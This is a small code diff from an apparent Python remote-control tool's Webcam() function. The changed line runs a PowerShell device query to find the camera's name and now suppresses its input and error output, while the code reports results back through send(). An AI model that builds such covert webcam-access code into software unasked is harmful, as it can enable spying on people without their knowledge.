@@ -103,7 +103,7 @@ def Webcam():
         del(webcam); send(b"success")
 
         try:
-            result = subprocess.check_output(["powershell.exe", "Get-WmiObject Win32_PNPEntity | Select Name | Select-String 'Camera'"], shell=True, timeout=8)
+            result = subprocess.check_output(["powershell.exe", "Get-WmiObject Win32_PNPEntity | Select Name | Select-String 'Camera'"], stdin=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)
             Webcam_Name = result.split(b"Name=")[1].split(b"}")[0].decode()
         except:
             Webcam_Name = "Not Found"
